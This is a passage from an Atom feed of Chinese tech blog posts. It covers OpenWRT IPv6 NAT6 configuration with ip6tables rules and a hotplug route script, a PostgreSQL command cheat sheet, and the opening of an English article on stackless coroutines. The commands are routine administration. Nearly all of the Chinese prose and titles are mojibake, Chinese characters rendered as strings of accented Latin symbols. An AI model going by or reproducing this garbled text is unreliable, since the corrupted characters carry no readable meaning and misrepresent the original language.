<p>Âà∞Ê≠§Ôºå‰∏Ä‰∏™ÁÆÄÂçïÁöÑvueÈ°πÁõÆÂ∞±ÂÆåÊàê‰∫ÜÔºåÂØπ‰∫éÂ¶Ç‰ΩïÁªÑÁªáÈ°πÁõÆÔºåÂâçÂêéÁ´ØÂ¶Ç‰Ωï‰∫§‰∫íÂ∫îËØ•Â∑≤ÁªèÊúâ‰∫ÜÂàùÊ≠•‰∫ÜËß£„ÄÇÊú¨Êñá‰πü‰ºöÊåÅÁª≠Êõ¥Êñ∞ÔºåÊ¨¢ËøéÂÖ≥Ê≥®ÊàëÁöÑ<a href="https://blog.creedowl.com/">blog</a></p>
<p>Êú¨ÊñáÁöÑÂÆû‰æãËØ∑ËÆøÈóÆ<a href="https://github.com/creedowl/vue_demo/">github</a></p>]]></content>
        <author>
            <name><![CDATA[Creedowl‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/04/data-migration-between-microservices/</id>
        <title><![CDATA[ÂæÆÊúçÂä°Êû∂ÊûÑ‰∏ãÁöÑÊï∞ÊçÆËøÅÁßªÊåáÂçó]]></title>
        <updated>2019-04-09T07:50:37+08:00</updated>
        <link href="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/04/data-migration-between-microservices/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (‰∏≠ÂõΩÊ†áÂáÜÊó∂Èó¥) --><p>Âú®ÊâáË¥ùÔºåÈô§‰∫Ü CRUD ‰ª•Â§ñÔºåÂÅöÁöÑÊúÄÂ§öÁöÑ‰∫ãÊÉÖÂ§ßÊ¶Ç‰πüÂ∞±ÊòØÊï∞ÊçÆËøÅÁßª‰∫ÜÔºå‰ª•Ëá≥‰∫éÂêéÊù•ÁÆÄÂçïÁöÑÊï∞ÊçÆËøÅÁßªÂ∑•‰ΩúÈÉΩÂèòÊàê‰∫Ü‰∏ÄÁßçÊê¨Á†ñ„ÄÇ‰ªäÂ§©Âä®Á¨îÂÜô‰∏ÄÂÜôÂú®ÊâáË¥ùÂÅöÊï∞ÊçÆËøÅÁßªÁöÑÊñπÊ≥ïÔºå‰ª•Âèä‰∏Ä‰∫õÈúÄË¶ÅÂÖ≥Ê≥®ÁöÑÁÇπ„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Stdio‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/</id>
        <title><![CDATA[ÂçóËà™Ê†°Âõ≠ÁΩëOpenWRTÈÖçÁΩÆIPv6 NAT6]]></title>
        <updated>2019-04-04T15:29:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/ipv6_and_nat6_in_nuaa/"><![CDATA[<blockquote>
<p>ÂΩìÂâçIPv6Ë∂äÊù•Ë∂äÊµÅË°åÔºå‰∏ç‰ΩÜËß£ÂÜ≥‰∫ÜIPv4Âú∞ÂùÄ‰∏çÂ§üÁî®ÁöÑÈóÆÈ¢òÔºåËøòËÉΩÁªôÊé•ÂÖ•ÁöÑËÆæÂ§áÊèê‰æõÂÖ¨ÁΩëËÆøÈóÆÁöÑÊîØÊåÅ„ÄÇ‰ΩÜÁî±‰∫éÊ†°Âõ≠ÁΩëÁöÑÁâπÊÆäÊÄßÔºåËôΩÁÑ∂ÂæàÊó©Â∞±Êúâ‰∫ÜIPv6ÊîØÊåÅÔºåÂ§ßÈÉ®ÂàÜÂ≠¶Ê†°Âú®IPv6Âú∞ÂùÄÂàÜÈÖç‰∏äÂç¥ÊúâÂâßÊØíÔºåÊó†Ê≥ïÂêë‰∏ãÊ∏∏ËÆæÂ§áÂàÜÈÖçÁã¨Á´ãÁöÑIPv6Âú∞ÂùÄÔºàÊ≠£Â∏∏ÂÆ∂Â∫≠ÁΩëÁªúÁéØÂ¢É‰∏≠Ë∑ØÁî±Âô®Âèä‰∏ãÊ∏∏ËÆæÂ§áÈÉΩËÉΩËá™Âä®ÂàÜÈÖçÁã¨Á´ãÁöÑÂÖ¨ÁΩëIPv6Âú∞ÂùÄÔºâÔºå‰ª•ÂçóËà™‰∏∫‰æãÔºåOpenWRT‰∏äËôΩÁÑ∂Ëé∑ÂèñÂà∞‰∫Ü2001ÂºÄÂ§¥Ôºå/64ÁªìÂ∞æÁöÑÂÖ¨ÁΩëIPv6Âú∞ÂùÄÔºå‰ΩÜ‰∏ãÊ∏∏ËÆæÂ§áÂç¥Êó†IPv6ËÆøÈóÆÊùÉÈôê„ÄÇÊú¨Êñá‰ªãÁªçÂçóËà™Ê†°Âõ≠ÁΩëÁéØÂ¢É‰∏ãÂ¶Ç‰ΩïÂú®OpenWRT‰∏ãËé∑ÂèñIPv6Âπ∂ÈÖçÁΩÆNAT6‰Ωø‰∏ãÊ∏∏ËÆæÂ§áÊã•ÊúâIPv6ËÆøÈóÆÊùÉÈôê„ÄÇ</p>
</blockquote>
<h2 id="0ËΩØÁ°¨‰ª∂ÈúÄÊ±Ç">0ÔºöËΩØÁ°¨‰ª∂ÈúÄÊ±Ç</h2>
<p><strong>Á°¨‰ª∂</strong>ÔºöÊîØÊåÅOpenWRTÂõ∫‰ª∂ÁöÑË∑ØÁî±Âô®ÊàñËΩØË∑ØÁî±ÔºàÊé®Ëçê‰ΩøÁî®ËΩØË∑ØÁî±ÔºåÊÄßËÉΩÊõ¥Â•ΩÔºåÊîØÊåÅÂêØÁî®Êõ¥Â§öÊúçÂä°Ôºå‰∏î‰∏çÈúÄË¶ÅËÄÉËôëÂ§™Â§öÂÖºÂÆπÊÄßÈóÆÈ¢òÔºåx86ÁâàÊú¨OpenWRT‰∏ÄÊääÊ¢≠Ôºâ</p>
<p><strong>ËΩØ‰ª∂</strong>ÔºöËæÉÊñ∞ÁâàÊú¨ÁöÑOpenWRTÊàñÂÖ∂Ë°çÁîüÁâàÊú¨ÔºàledeÔºåpandoraboxÁ≠âÔºå‰ΩÜÂéüÁâàOpenWRTÊúÄ‰Ω≥Ôºâ</p>
<p><strong>OpenWRTÂÜÖÊ†∏ÈúÄÈ´ò‰∫é3.7</strong>Ôºå linux kernelÂú®3.7ÁâàÊú¨ÂºÄÂßãÊîØÊåÅNAT6</p>
<p><del>ÂÜÖÊ†∏ÁâàÊú¨‰∏çÂ§üÈ´ò‰∏îÊó†Ê≥ïÂçáÁ∫ßÂèØ‰ª•Â∞ùËØïÊó©Âπ¥Áî±ÂåóÈÇÆÂ§ß‰Ω¨ÂºÄÂèëÁöÑNAT66È°πÁõÆÔºå‰ΩÜ‰∏çÊé®Ëçê</del></p>
<p>ÊâÄÈúÄËΩØ‰ª∂ÂåÖÔºö</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">ip6tables kmod-ipt-nat6 kmod-ip6tables kmod-ip6tables-extra luci-proto-ipv6 iputils-traceroute6
</code></pre></div><p>ËæÉÊñ∞ÁâàÊú¨Â∑≤ÁªèËá™Â∏¶IPv6ÊîØÊåÅÔºåËÄÅÁâàÊú¨ÈúÄË¶ÅËá™Â∑±ÂÆâË£ÖÁõ∏ÂÖ≥ËΩØ‰ª∂ÂåÖÔºå‰ΩÜÂÖºÂÆπÊÄßËæÉÂ∑ÆÔºåÊàñËÄÖÂÜÖÊ†∏ÁâàÊú¨‰∏çË∂≥ÔºåÂª∫ËÆÆÊâæËæÉÊñ∞ÁâàÊú¨ÊàñËÄÖËá™Ë°åÁºñËØë„ÄÇ</p>
<h2 id="1openwrtÈÖçÁΩÆËé∑Âèñipv6">1ÔºöOpenWRTÈÖçÁΩÆËé∑ÂèñIPv6</h2>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304901671.png/compress" alt="IPv6_setting_1"></p>
<h3 id="1-‰øÆÊîπipv6-ulaÂâçÁºÄ‰∏∫fdÂºÄÂ§¥ÈªòËÆ§‰∏∫ddÂºÄÂ§¥">1. ‰øÆÊîπIPv6 ULAÂâçÁºÄ‰∏∫fdÂºÄÂ§¥ÔºàÈªòËÆ§‰∏∫ddÂºÄÂ§¥Ôºâ</h3>
<h3 id="2-‰øÆÊîπwan6Âè£ÈÖçÁΩÆÂ¶Ç‰∏ãÂõæÊâÄÁ§∫">2. ‰øÆÊîπwan6Âè£ÈÖçÁΩÆÔºàÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºâ</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304939503.png/compress" alt="IPv6_setting_2"></p>
<h3 id="3-‰øÆÊîπlanÂè£dhcpÊúçÂä°Âô®ÈÖçÁΩÆÂ¶Ç‰∏ãÂõæÊâÄÁ§∫">3. ‰øÆÊîπlanÂè£DHCPÊúçÂä°Âô®ÈÖçÁΩÆÔºàÂ¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºâ</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304973656.png/compress" alt="IPv6_setting_3"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588304997028.png/compress" alt="IPv6_setting_4"></p>
<p>Ê≠§Êó∂Á®çÁ≠âÁâáÂàªÔºåÂú®Ê¶ÇÂÜµ‰∏≠Â∫îËØ•Â∞±ËÉΩÁúãÂà∞Ëé∑ÂèñÂà∞ÁöÑIPv6Âú∞ÂùÄÂèä‰∏ãÊ∏∏ËÆæÂ§áDHCPv6ÂàÜÈÖçÂÜÖÁΩëIPv6Âú∞ÂùÄ</p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305013341.png/compress" alt="IPv6_setting_5"></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305030637.png/compress" alt="IPv6_setting_6"></p>
<p>Áé∞Âú®‰Ω†ÁöÑË∑ØÁî±Âô®Â∑≤ÁªèÂèØ‰ª•‰ΩøÁî®IPv6‰∫ÜÔºå‰ΩÜ‰∏ãÊ∏∏ËÆæÂ§áÂπ∂‰∏çË°åÔºåÂ∞±ÈúÄË¶ÅÈÖçÁΩÆNAT6„ÄÇ</p>
<h2 id="2ÈÖçÁΩÆnat6">2ÔºöÈÖçÁΩÆNAT6</h2>
<p>ËôΩÁÑ∂NAT6Âπ∂‰∏çÁ¨¶ÂêàIPv6ÁöÑËÆæËÆ°Âì≤Â≠¶Ôºå‰ΩÜÂç¥ËÉΩËß£ÂÜ≥‰∏Ä‰∫õÈóÆÈ¢òÔºåÂ¶ÇÂÆâÂÖ®ÈöîÁ¶ªÔºåÊàñËÄÖÂÉèÊàë‰ª¨ËøôÊ†∑ÈÄöËøáÂçï‰∏ÄÂú∞ÂùÄËΩ¨ÂèëÁªôÂ§ö‰∏™ËÆæÂ§á‰ΩøÁî®„ÄÇ</p>
<h3 id="1-‰øÆÊîπÈò≤ÁÅ´Â¢ô">1. ‰øÆÊîπÈò≤ÁÅ´Â¢ô</h3>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305046715.png/compress" alt="IPv6_setting_7"></p>
<p>Âä†ÂÖ•‰ª•‰∏ãËá™ÂÆö‰πâËßÑÂàô</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">WAN6</span><span class="o">=</span>pppoe-wan
<span class="nv">LAN</span><span class="o">=</span>br-lan
ip6tables -t nat -A POSTROUTING -o <span class="nv">$WAN6</span> -j MASQUERADE
ip6tables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
ip6tables -A FORWARD -i <span class="nv">$LAN</span> -j ACCEPT
</code></pre></div><p><strong>Ê≥®ÊÑèËøôÈáåWAN6ÂíåLANË¶ÅÊîπ‰∏∫Â§ñÁΩëIPv6ÂíåÂÜÖÁΩëÁΩëÂç°ÂêçÂ≠óÔºåÂú®ÁªàÁ´Ø‰ΩøÁî®ifconfigÊü•Áúã</strong></p>
<p><img src="https://blog-1251984664.cos.ap-shanghai.myqcloud.com/UTOOLS1588305068355.png/compress" alt="IPv6_setting_8"></p>
<h3 id="2-ÈÖçÁΩÆÁΩëÂÖ≥">2. ÈÖçÁΩÆÁΩëÂÖ≥</h3>
<p>Âú®ÁªàÁ´ØÊâßË°å <code>ip -6 r</code> Êü•ÁúãÈªòËÆ§ÁΩëÂÖ≥ÔºàdefaultÂºÄÂ§¥ÔºâÔºåÂ¶ÇÊûúÊòØÁ±ª‰ºº</p>
<p><code>default from 2001:xxxx:xxxx:xxxx::/64 via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512 pref medium</code></p>
<p>ËøôÊ†∑ËõãÁñºÁöÑÁΩëÂÖ≥ÔºåÈúÄË¶ÅÂéªÊéâ<code>from 2001:xxxx:xxxx:xxxx::/64</code> ËøôÊÆµÂÜçÊ∑ªÂä†ÈªòËÆ§ÁΩëÂÖ≥Ôºå‰æãÂ¶Ç</p>
<p><code>ip -6 route add default via fe80::ded2:fcff:fe98:64f7 dev pppoe-wan proto static metric 512</code></p>
<p>ÂèØ‰ª•Âª∫Á´ã‰∏Ä‰∏™<code>/etc/hotplug.d/iface/99-ipv6</code>ÂÆûÁé∞Ëá™Âä®ÈÖçÁΩÆ</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="cp">#!/bin/sh
</span><span class="cp"></span><span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$ACTION</span><span class="s2">&#34;</span> <span class="o">=</span> ifup <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
<span class="nv">iface</span><span class="o">=</span>wan6
<span class="o">[</span> -z <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> -o <span class="s2">&#34;</span><span class="nv">$INTERFACE</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="nv">$iface</span><span class="s2">&#34;</span> <span class="o">]</span> <span class="o">||</span> <span class="nb">exit</span> <span class="m">0</span>
ip -6 route add <span class="sb">`</span>ip -6 route show default<span class="p">|</span>sed -e <span class="s1">&#39;s/from [^ ]* //&#39;</span><span class="sb">`</span>
logger -t IPv6 <span class="s2">&#34;Add IPv6 default route.&#34;</span>
</code></pre></div><p>ÊúÄÂêéÂà´Âøò‰∫Ü‰øÆÊîπÊùÉÈôê</p>
<p><code>chmod +x /etc/hotplug.d/iface/99-ipv6</code></p>
<p>ÈáçÂêØË∑ØÁî±Âô®Â∞±ÂèØ‰ª•ÊÑâÂø´ÁöÑÁé©ËÄç‰∫Ü„ÄÇ</p>
<p><del>Êú¨Êù•ËøòÊÉ≥ÊäòËÖæIPv6Á´ØÂè£ËΩ¨ÂèëÔºå‰ΩÜ‰∏ÄÁõ¥Êó†Ê≥ïÈÖçÁΩÆÊàêÂäü„ÄÇÂêéÊù•Á™ÅÁÑ∂ÂèëÁé∞ÂçóËà™Ê†°Âõ≠ÁΩë‰∏ãÊ≤°ÊúâÂØπIPv4ÂÅö‰∏•Ê†ºÈöîÁ¶ªÔºàÈô§‰∫Ü80Á´ØÂè£Âü∫Êú¨‰∏äÈÉΩËÉΩÁõ¥Êé•ËÆøÈóÆÔºâÔºåÂ∞±Áõ¥Êé•ÂÅöIPv4Á´ØÂè£ËΩ¨ÂèëÈÖçÂêàDDNSÔºåËøûÊé•Ê†°Âõ≠WIFIÔºànuaa.portalÔºå<strong>‰ªòË¥πÁâàÊú¨</strong>ÔºâÂ∞±ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî®ÔºåÈÄüÂ∫¶ËøòÊå∫Âø´„ÄÇ„ÄÇ„ÄÇÂ∞±ÁúüÈ¶ô‰∫Ü„ÄÇ„ÄÇ‰∏çËøáÈÖçÁΩÆIPv6Á´ØÂè£ËΩ¨ÂèëËøòÊòØÊúâÊÑè‰πâÔºåÊØîÂ¶ÇÂèØ‰ª•‰ªéÈùûÊ†°Âõ≠ÁΩëËÆøÈóÆÔºåÊ†°Âõ≠ÁΩëËÆøÈóÆIPv6Êó†ÈúÄËÆ§ËØÅÔºà‰∏çË¶ÅÂÖÖÈí±‰∫ÜÔºâÔºåÁõ∏ÂÖ≥ÊïôÁ®ãÊúâÁ©∫ÂÜçË°•‰∏äÔºàÂíïÂíïÂíïÔºâÊúâÈúÄÊ±ÇÂèØ‰ª•ÂèÇËÄÉ<a href="https://shura.eu.org/2018/12/06/ipv6-NAT%E5%90%8E%E9%85%8D%E7%BD%AE%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">ipv6 NATÂêéÈÖçÁΩÆÁ´ØÂè£ËΩ¨Âèë</a></del></p>
<h2 id="ÂèÇËÄÉËµÑÊñô">ÂèÇËÄÉËµÑÊñô</h2>
<blockquote>
<p><a href="https://github.com/tuna/ipv6.tsinghua.edu.cn/blob/master/openwrt.md">Ê∏ÖÂçéOpenWRT Ë∑ØÁî±Âô®‰Ωú‰∏∫ IPv6 ÁΩëÂÖ≥ÁöÑÈÖçÁΩÆ</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/03/geektime-microservice-notes/</id>
        <title><![CDATA[„Ää‰ªé 0 ÂºÄÂßãÂ≠¶ÂæÆÊúçÂä°„ÄãÈòÖËØªÁ¨îËÆ∞]]></title>
        <updated>2019-03-30T11:58:25+08:00</updated>
        <link href="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/03/geektime-microservice-notes/"><![CDATA[<!-- build time:Wed Jun 19 2019 17:59:18 GMT+0800 (‰∏≠ÂõΩÊ†áÂáÜÊó∂Èó¥) --><p>Ââç‰∏ÄÈòµÂ≠êË¥≠‰π∞‰∫ÜËÉ°Âø†ÊÉ≥ËÄÅÂ∏àÁöÑ„Ää‰ªé 0 ÂºÄÂßãÂ≠¶ÂæÆÊúçÂä°„ÄãÊûÅÂÆ¢Êó∂Èó¥‰∏ìÊ†èÔºå‰∫åÊúà‰ªΩÁúãÂÆå‰ª•ÂêéÂÅö‰∫Ü‰∏Ä‰∫õÁ¨îËÆ∞„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[Stdio‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/postgres-handbook/</id>
        <title><![CDATA[PostgreSQL ÁÆÄ‰ªã‰∏éÂ∏∏Áî®ÂëΩ‰ª§]]></title>
        <updated>2019-02-03T10:32:39+08:00</updated>
        <link href="https://blog.creedowl.com/posts/postgres-handbook/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/postgres-handbook/"><![CDATA[<h1 id="postgresql-ÁÆÄ‰ªã‰∏éÂ∏∏Áî®ÂëΩ‰ª§">PostgreSQL ÁÆÄ‰ªã‰∏éÂ∏∏Áî®ÂëΩ‰ª§</h1>
<p>PostgreSQLÔºåÁÆÄÁß∞postgresÔºåÊòØÁªßmysqlË¢´Êî∂Ë¥≠‰πãÂêéÊûÅ‰∏∫ÁÉ≠Èó®ÁöÑÂºÄÊ∫êÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÔºåËøôÁØáÊñáÁ´†ÁÆÄÂçïËÆ∞ÂΩï‰∏Ä‰∫õ‰ΩøÁî®ËøáÁ®ã‰∏≠ÁöÑÂü∫Êú¨Áî®Ê≥ï„ÄÇ</p>
<h2 id="ÂÆâË£Ö">ÂÆâË£Ö</h2>
<p>‰∏∫‰∫Ü‰øùËØÅÂÆø‰∏ªÊú∫ÁéØÂ¢ÉÁöÑÁ∫ØÂáÄÔºåËøôÈáå‰ΩøÁî®dockerÊù•ÂÆâË£Öpostgres</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">docker run --name postgres -p 5432:5432 -e <span class="nv">POSTGRES_PASSWORD</span><span class="o">=</span>password -d postgres
</code></pre></div><p>Â∏∏Áî®ÁéØÂ¢ÉÂèòÈáè</p>
<blockquote>
<p>POSTGRES_USER: Êï∞ÊçÆÂ∫ìÁî®Êà∑ÔºåÁº∫ÁúÅpostgres</p>
<p>POSTGRES_PASSWORD: Êï∞ÊçÆÂ∫ìÂØÜÁ†Å ps. Ëã•‰ªélocalhostËøûÊé•ÂàôÈªòËÆ§trustÔºå‰∏çÈúÄË¶ÅÂ°´ÂÜô</p>
<p>POSTGRES_DB: Êï∞ÊçÆÂ∫ìÂêçÔºåÁº∫ÁúÅpostgres</p>
</blockquote>
<p>Êõ¥Â§ödockerÁõ∏ÂÖ≥ÂÜÖÂÆπÂèÇËÄÉ<a href="https://hub.docker.com/_/postgres">postgresÂÆòÊñπdockerÈïúÂÉèÈ°µÈù¢</a></p>
<h2 id="Â∏∏Áî®ÂëΩ‰ª§">Â∏∏Áî®ÂëΩ‰ª§</h2>
<p><strong>ËøûÊé•Êï∞ÊçÆÂ∫ì</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql -U user -d database -h host -p port
</code></pre></div><p><strong>ÂØºÂÖ•Êï∞ÊçÆ</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">psql database &lt; db.sql
</code></pre></div><p><strong>ÊéßÂà∂Âè∞ÂëΩ‰ª§</strong></p>
<blockquote>
<p>\hÔºöÊü•ÁúãSQLÂëΩ‰ª§ÁöÑËß£ÈáäÔºåÊØîÂ¶Ç\h select„ÄÇ</p>
<p>?ÔºöÊü•ÁúãpsqlÂëΩ‰ª§ÂàóË°®„ÄÇ</p>
<p>\lÔºöÂàóÂá∫ÊâÄÊúâÊï∞ÊçÆÂ∫ì„ÄÇ</p>
<p>\c [database_name]ÔºöËøûÊé•ÂÖ∂‰ªñÊï∞ÊçÆÂ∫ì„ÄÇ</p>
<p>\dÔºöÂàóÂá∫ÂΩìÂâçÊï∞ÊçÆÂ∫ìÁöÑÊâÄÊúâË°®Ê†º„ÄÇ</p>
<p>\d [table_name]ÔºöÂàóÂá∫Êüê‰∏ÄÂº†Ë°®Ê†ºÁöÑÁªìÊûÑ„ÄÇ</p>
<p>\duÔºöÂàóÂá∫ÊâÄÊúâÁî®Êà∑„ÄÇ</p>
<p>\eÔºöÊâìÂºÄÊñáÊú¨ÁºñËæëÂô®„ÄÇ</p>
<p>\conninfoÔºöÂàóÂá∫ÂΩìÂâçÊï∞ÊçÆÂ∫ìÂíåËøûÊé•ÁöÑ‰ø°ÊÅØ„ÄÇ</p>
</blockquote>
<p><strong>Êï∞ÊçÆÂ∫ìÊìç‰Ωú</strong></p>
<p><em>ÈááÁî®Âü∫Êú¨sqlËØ≠Ê≥ï</em></p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="err">Âª∫Ë°®</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="k">user</span> <span class="p">(</span>
	<span class="n">id</span> <span class="nb">SERIAL</span> <span class="k">PRIMARY</span> <span class="k">KEY</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">);</span>

<span class="o">#</span> <span class="err">ÊèíÂÖ•</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">user</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>

<span class="o">#</span> <span class="err">ÈÄâÊã©</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Êõ¥Êñ∞</span>
<span class="k">UPDATE</span> <span class="k">user</span> <span class="k">SET</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;qwer&#39;</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Âà†Èô§</span>
<span class="k">DELETE</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Ê∑ªÂä†Ê†è‰Ωç</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ADD</span> <span class="n">gender</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

<span class="o">#</span> <span class="err">Êõ¥Êñ∞Ë°®ÁªìÊûÑ</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ALTER</span> <span class="k">COLUMN</span> <span class="n">gender</span> <span class="k">SET</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Â≠óÊÆµÊõ¥Âêç</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">COLUMN</span> <span class="n">name</span> <span class="k">TO</span> <span class="n">username</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Âà†Èô§Â≠óÊÆµ</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">DROP</span> <span class="k">COLUMN</span> <span class="n">gender</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Ë°®ÂêçÊõ¥Êîπ</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">TO</span> <span class="n">users</span><span class="p">;</span>

<span class="o">#</span> <span class="err">Âà†Èô§Ë°®Ê†º</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">users</span><span class="p">;</span>
</code></pre></div><h2 id="Áõ∏ÂÖ≥ÈìæÊé•">Áõ∏ÂÖ≥ÈìæÊé•</h2>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html">PostgreSQLÊñ∞ÊâãÂÖ•Èó®</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowl‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[LinuxÂÜÖÊ†∏gdb+qemuË∞ÉËØï]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[LinuxÂÜÖÊ†∏gdb+qemuË∞ÉËØï]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/</id>
        <title><![CDATA[Coroutines: Lightweight Threads for Concurrency]]></title>
        <updated>2019-01-12T16:00:00+08:00</updated>
        <link href="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"/>
        <content type="text/html" src="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"><![CDATA[<img src="https://images.unsplash.com/photo-1501820434261-5bb046afcf6b?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Coroutines: Lightweight Threads for Concurrency"><p><strong>Outdated:</strong> This post was written in January, 2019 and is not currently maintained.</p><!--kg-card-begin: html--><hr><!--kg-card-end: html--><p>In concurrent applications, we need a way to allow different tasks to make progress at the ‚Äúsame‚Äù time, which is known as concurrency. The most widely-used technology for concurrency is threads, the minimal execution unit provided by the operating system. However, there is a non-negligible overhead associated with multi-threading, especially when the threads are only performing small, lightweight tasks.</p><p>Multithreading overhead comes from how threads are implemented in operating systems. In Linux, a thread is just a "lightweight" process that shares resources, like virtual memory, with its parent process. When a thread yields control and begins to wait on an event to wake up, the operating system will take over control, find the next suitable process to run, and switch to that process, just like what it would do with normal processes. This introduces a significant overhead for many kinds of multithread applications, especially those requiring frequent message passing between threads. Additionally, when a thread is created or destroyed, the operating system has to initialize or destroy the thread control block (TCB, <code>task_struct</code> in Linux), which is a non-trivial operation.</p><p>Coroutine is a mechanism for reducing multithreading overheads. As a userspace equivalent of threads, coroutines are managed entirely in userspace and is opaque to the underlying OS.</p><h2 id="stackless-coroutines">Stackless Coroutines</h2><p>There are two types of coroutine systems, stackless and stackful. A stackless coroutine system is usually implemented with some kind of language-level transformations, like the CPS (Continuation Passing Style) transformation. A program in CPS form, as its name suggests, instead of passing the results of computations by return values, passes them by ‚Äúcontinuations‚Äù, which looks like:</p><pre><code>// Original form
let a = f1()
let b = f2(a)
print(b)

// CPS form
f1(
    a =&gt; f2(
        a,
        b =&gt; print(b)
    )
)
</code></pre><p>The code above looks like the ancient JavaScript callback pattern, doesn't it? JavaScript is by design single threaded and asynchronous, and blocking operations have to be implemented with callbacks. In fact, this kind of callbacks is an explicit form of CPS, regardless of whether <code>Promise</code> is used to avoid problems like <a href="https://en.wiktionary.org/wiki/callback_hell">callback hell</a>. To simplify programming, <code>async/await</code> syntax is introduced later, which enables users to write code that looks synchronous but is in fact asynchronous, and is usually implemented with automatic CPS transformation.</p><p>Another approach to stackless coroutine is to make use of a big <code>switch</code> loop:</p><pre><code>// Original form
int f1(int a) {
    int i, v = 0;
    for(i = 0; i &lt; a; i++) v += i;
